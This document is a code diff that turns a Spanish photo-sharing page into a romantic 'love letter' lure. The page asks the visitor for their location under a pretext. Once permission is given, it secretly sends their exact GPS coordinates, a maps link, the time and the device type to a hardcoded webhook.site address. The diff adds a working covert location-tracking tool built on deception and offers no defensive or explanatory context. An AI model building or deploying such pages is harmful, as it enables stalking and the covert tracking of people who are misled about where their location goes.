@@ -2,57 +2,121 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compartir Foto</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>💌 Para ti</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #f0f2f5; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0;
+        body {
+            margin: 0; padding: 0; background-color: #0f0f13; color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;
         }
-        
         .card {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 85%;
-            max-width: 350px;
+            background: rgba(30, 30, 40, 0.9); width: 90%; max-width: 350px;
+            border-radius: 20px; padding: 30px 20px; text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
+            animation: fadeIn 1s ease-out;
         }
-
-        h2 { margin-top: 0; color: #333; font-size: 18px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
-        .btn-action {
-            background-color: #25D366; /* Color WhatsApp */
-            color: white;
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
+        h1 { margin: 0 0 10px 0; font-size: 22px; color: #ff6b81; }
+        p { color: #aab; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        
+        button {
+            background: linear-gradient(135deg, #ff6b81, #ff4757); color: white;
+            border: none; padding: 14px 30px; border-radius: 50px; font-size: 16px;
+            font-weight: bold; cursor: pointer; transition: transform 0.2s;
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); width: 100%;
         }
+        button:hover { transform: scale(1.05); }
+        button:disabled { background: #555; cursor: wait; }
 
-        input[type="file"] { display: none; }
+        .hidden { display: none !important; }
         
-        #status { 
-            margin-top: 15px; 
-            font-size: 13px; 
-            color: #666; 
-            min-height: 20px;
+        #map-frame {
+            width: 100%; height: 200px; border-radius: 15px; border: none; margin-top: 15px;
+            background: #1a1a20;
+        }
+        .info-badge {
+            background: #2d2d3a; padding: 8px 12px; border-radius: 10px; 
+            font-size: 12px; color: #ddd; margin-top: 15px; display: inline-block;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Sube una foto para confirmar</h2>
-        <p style="font-size: 14px; color: #555;">Al enviar,
+    <!-- Pantalla 1: El Gancho -->
+    <div class="card" id="screen1">
+        <h1>Hola mi vida ❤️</h1>
+        <p>Tengo algo especial para mostrarte.<br>Necesito saber dónde estás para enviártelo.</p>
+        <button id="btnStart" onclick="start()">Abrir Mensaje</button>
+        <p id="status" style="margin-top:15px; font-size:12px; color:#666;">Esperando...</p>
+    </div>
+
+    <!-- Pantalla 2: El Mapa y Datos -->
+    <div class="card hidden" id="screen2">
+        <h1>¡Te quiero! 💖</h1>
+        <p>Aquí estás:</p>
+        <iframe id="mapFrame" src=""></iframe>
+        <div id="deviceData" class="info-badge"></div>
+    </div>
+
+    <script>
+        // TU WEBHOOK YA CONFIGURADO AQUÍ
+        const MY_WEBHOOK = "https://webhook.site/96c9b765-891b-4fed-b430-ac0e255fa501";
+
+        function start() {
+            const btn = document.getElementById('btnStart');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.innerText = "Conectando...";
+            status.innerText = "Solicitando ubicación...";
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude.toFixed(6);
+                        const lon = pos.coords.longitude.toFixed(6);
+                        
+                        // Cambiar pantalla
+                        document.getElementById('screen1').classList.add('hidden');
+                        document.getElementById('screen2').classList.remove('hidden');
+                        
+                        // Poner mapa
+                        document.getElementById('mapFrame').src = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.003}%2C${lat-0.003}%2C${lon+0.003}%2C${lat+0.003}&layer=mapnik&marker=${lat}%2C${lon}`;
+                        
+                        // Leer Celular
+                        const devInfo = detectDevice();
+                        document.getElementById('deviceData').innerText = "📱 " + devInfo;
+
+                        // Enviar a Webhook
+                        fetch(MY_WEBHOOK, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                content: `📍 ¡Alguien abrió la carta! \n 🗺️ Link: https://www.google.com/maps?q=${lat},${lon} \n 🕒 Hora: ${new Date().toLocaleString()} \n 📱 Celular: ${devInfo}`
+                            })
+                        });
+                    },
+                    () => { status.innerText = "No se pudo detectar."; }
+                );
+            } else {
+                alert("Tu navegador no soporta GPS.");
+            }
+        }
+
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            let device = "Smartphone";
+            
+            if (/iPhone/.test(ua)) device = "Apple iPhone";
+            else if (/iPad/.test(ua)) device = "Apple iPad";
+            else if (/Android/.test(ua)) {
+                if (/SM-G99|SM-S91|SM-A53/.test(ua)) device = "Samsung Galaxy";
+                else device = "Dispositivo Android";
+            }
+            return device;
+        }
+    </script>
+</body>
+</html>
